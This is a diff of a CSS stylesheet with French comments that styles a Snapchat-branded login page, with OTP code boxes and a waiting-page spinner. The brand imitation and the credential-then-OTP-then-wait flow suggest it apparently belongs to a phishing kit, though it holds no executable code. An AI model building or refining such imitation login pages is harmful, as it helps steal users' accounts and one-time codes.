@@ -1,69 +1,169 @@
+/* --- Variables et Styles Globaux --- */
+:root {
+  --snap-yellow: #FFFC00;
+  --snap-black: #000000;
+  --snap-white: #FFFFFF;
+  --snap-gray: #4A4A4A;
+  --light-gray: #F7F7F7;
+  --error-red: #E74C3C;
+  --success-green: #2ECC71;
+}
+
 * {
   box-sizing: border-box;
   margin: 0;
   padding: 0;
 }
+
 body {
-  font-family: Arial, sans-serif;
-  background: linear-gradient(135deg, #fffc00 0%, #fffb00 100%);
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background-color: var(--snap-white);
+  color: var(--snap-black);
   min-height: 100vh;
   display: flex;
   justify-content: center;
   align-items: center;
+  padding: 20px;
 }
+
 .container {
-  background: #fff;
-  padding: 40px 30px;
-  border-radius: 12px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-  text-align: center;
-  max-width: 400px;
   width: 100%;
+  max-width: 420px;
+  background: var(--snap-white);
+  border-radius: 24px;
+  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+  padding: 40px;
+  text-align: center;
+  border: 1px solid #eaeaea;
 }
-.logo {
-  width: 80px;
-  margin-bottom: 20px;
-}
+
+/* --- Éléments Communs --- */
 h1 {
-  font-size: 28px;
-  margin-bottom: 12px;
+  font-size: 32px;
+  font-weight: 800;
+  margin-bottom: 8px;
+  color: var(--snap-black);
 }
+
+h2 {
+  font-size: 24px;
+  font-weight: 700;
+  margin-bottom: 12px;
+  color: var(--snap-black);
+}
+
 p {
-  color: #666;
+  font-size: 16px;
+  color: var(--snap-gray);
+  line-height: 1.5;
   margin-bottom: 24px;
 }
+
+.logo {
+  width: 80px;
+  height: 80px;
+  margin-bottom: 24px;
+  filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+}
+
+/* --- Formulaire et Champs --- */
 input {
   width: 100%;
-  padding: 14px;
+  padding: 16px;
   margin-bottom: 16px;
-  border: 1px solid #ddd;
-  border-radius: 8px;
+  border: 2px solid #f0f0f0;
+  border-radius: 12px;
   font-size: 16px;
+  transition: all 0.2s ease-in-out;
+  background-color: var(--light-gray);
 }
+
+input:focus {
+  outline: none;
+  border-color: var(--snap-yellow);
+  background-color: var(--snap-white);
+  box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.2);
+}
+
 button {
   width: 100%;
-  padding: 14px;
-  background: #fffc00;
+  padding: 16px;
+  background-color: var(--snap-black);
+  color: var(--snap-white);
   border: none;
-  border-radius: 8px;
+  border-radius: 12px;
   font-size: 16px;
-  font-weight: bold;
+  font-weight: 700;
   cursor: pointer;
-  transition: background 0.3s;
+  transition: all 0.2s ease-in-out;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
 }
-button:hover {
-  background: #e6e600;
+
+button:hover:not(:disabled) {
+  background-color: #333;
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
 }
+
+button:disabled {
+  background-color: #ccc;
+  cursor: not-allowed;
+  transform: none;
+}
+
+/* --- Page OTP --- */
 .otp-inputs {
   display: flex;
   justify-content: center;
-  gap: 10px;
-  margin-bottom: 20px;
+  gap: 12px;
+  margin-bottom: 24px;
 }
+
 .otp-inputs input {
+  width: 60px;
+  height: 60px;
+  text-align: center;
+  font-size: 28px;
+  font-weight: bold;
+  padding: 10px;
+}
+
+/* --- Page d'attente --- */
+.spinner {
+  border: 4px solid var(--light-gray);
+  border-top: 4px solid var(--snap-black);
+  border-radius: 50%;
   width: 50px;
   height: 50px;
-  text-align: center;
-  font-size: 24px;
-  font-weight: bold;
+  animation: spin 1s linear infinite;
+  margin: 24px auto;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* --- Messages d'erreur et de statut --- */
+#error-message, #status-message {
+  color: var(--error-red);
+  font-weight: 600;
+  display: block; /* S'assure que le message est visible */
+}
+
+#status-message.success {
+  color: var(--success-green);
+}
+
+/* --- Responsive Design --- */
+@media (max-width: 480px) {
+  .container {
+    padding: 30px 20px;
+  }
+  .otp-inputs input {
+    width: 50px;
+    height: 50px;
+    font-size: 24px;
+  }
 }
